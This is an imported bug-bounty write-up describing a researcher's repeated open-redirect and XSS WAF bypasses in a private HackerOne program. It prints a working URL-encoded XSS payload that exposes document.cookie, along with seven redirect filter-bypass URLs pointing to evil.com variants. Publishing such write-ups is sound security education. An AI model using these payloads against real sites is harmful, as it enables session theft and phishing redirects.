---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2023-09-24_discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-.md
original_filename: 2023-09-24_discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-.md
title: Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program
  Using the Same Parameters
category: documents
detected_topics:
- xss
- command-injection
tags:
- imported
- documents
- xss
- command-injection
language: en
raw_sha256: 842e1f75c13f3a360113d2ac2117d2b0b5a83d62ac996e4170fea9aa8336a34d
text_sha256: 4f30f6bc14d0cc190029feb4c0df639a3371dedc225e59debbf78f0ebad7e13b
ingested_at: '2026-06-28T07:32:26Z'
sensitivity: unknown
redactions_applied: false
---

# Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using the Same Parameters

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2023-09-24_discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-.md
- Source Type: markdown
- Detected Topics: xss, command-injection
- Ingested At: 2026-06-28T07:32:26Z
- Redactions Applied: False
- Raw SHA256: `842e1f75c13f3a360113d2ac2117d2b0b5a83d62ac996e4170fea9aa8336a34d`
- Text SHA256: `4f30f6bc14d0cc190029feb4c0df639a3371dedc225e59debbf78f0ebad7e13b`


## Content

---
title: "Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using the Same Parameters"
url: "https://0xm5awy.medium.com/discovering-7-open-redirect-bypasses-and-3-xss-bypasses-within-a-single-program-using-same-8e87581e1a75"
authors: ["Mohamed Anani (@0xM5awy)"]
bugs: ["XSS", "Open redirect", "URL validation bypass"]
publication_date: "2023-09-24"
added_date: "2023-10-03"
source: "pentester.land/writeups.json"
original_index: 749
scraped_via: "browseros"
---

# Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using the Same Parameters

Top highlight

Mohamed Anani
Follow
3 min read
·
Sep 23, 2023

789

4

Discovering 7 Open Redirect Bypasses and 3 XSS Bypasses Within a Single Program Using the Same Parameters
Press enter or click to view image in full size

In today’s Write-up, I will share my journey of uncovering 7 open redirects and 3 XSS WAF (Web Application Firewall) bypasses within 1 program, all using the same parameters. The process unfolded as follows: I would report a vulnerability, they’d promptly fix it and reward me. However, I continued to bypass their fixes and reported the issues anew, repeating this cycle until I successfully uncovered 7 open redirects and 3 XSS WAF bypasses. Join me as we delve into the details of these vulnerabilities

Part 1: Bypassing WAF to Execute XSS

Cross-Site Scripting (XSS) is a serious web vulnerability that allows attackers to inject malicious scripts into web applications viewed by other users. WAFs are designed to detect and block such attacks, but determined attackers can find ways to bypass these security measures.

Payload Used:

javascript%3Avar%7Ba%3Aonerror%7D%3D%7Ba%3Aalert%7D%3Bthrow%2520document.cookie

XSS Bypass via External Link
URL: https://www.0xm5awy.com/link/out?ext=payload
By crafting URLs with parameters like “ext=payload,” attackers may attempt to bypass the WAF’s detection mechanisms by disguising the payload.

2. XSS Bypass Through Login Page:

URL: https://www.0xm5awy.com/login?lastUrl=payload
Attackers can manipulate the “lastUrl” parameter to include malicious payloads, aiming to trick the WAF into allowing the XSS attack.

3. XSS Bypass via Complete Profile Page:

URL: https://www.0xm5awy.com/complete-profile?r=payload
Similarly, the “r” parameter can be manipulated to smuggle XSS payloads and bypass the WAF.

Part 2: Bypassing Filters in Redirection Attacks

Redirection attacks involve tricking users into visiting malicious websites or domains. WAFs often employ filters to block potentially harmful redirections, but attackers can employ clever techniques to evade detection.

No Filter:
URL: https://www.0xm5awy.com/login?lastUrl=https://www.evil.com
Attackers can pass a domain like “evil.com” and it will Redirect it without any problems
Get Mohamed Anani’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

2. Bypass the filter check useing domain name:

URL: https://www.0xm5awy.com/login?lastUrl=https://attacker-0xm5awy.com
Attackers may use subdomains to appear legitimate while bypassing domain name checks.

3. Bypass the filter if it only allows you to control the path using a nullbyte (1):

URL: https://www.0xm5awy.com/login?lastUrl=/%0d/evil.com
Incorporating nullbytes (%0d) in URLs can confuse the filter and allow attackers to execute redirections.

4. Bypass the filter if it only allows you to control the path (2):

URL: https://www.0xm5awy.com/verify/notification?r=/%0d/evil.com
Incorporating nullbytes (%0d) in URLs can confuse the filter and allow attackers to execute redirections.

5. Bypass the filter if it only checks for domain name using a dot:

URL: https://www.0xm5awy.com/verify/notification?i=&r=/%0D/evil%25%32%65com
Attackers can manipulate character encoding to bypass filters, even when using special characters.

6. Domain Substitution:

URL: https://api.0xm5awy.com/verify/key/register?i=&r=-evil.com
By appending a hyphen, attackers can trick filters into allowing potentially malicious domains.

7. Bypassing Using Dot in Domain:

URL: https://api.0xm5awy.com/verify/key/magic-link?i==&r=.evil.com
This technique involves using a dot to obscure malicious intent and bypass security checks.
All of these vulnerabilities were discovered by me during participation in a private bug bounty program on HackerOne. With this, we’ve come to the end of this article. I hope you’ve learned something valuable from my experiences! See you in the next article!
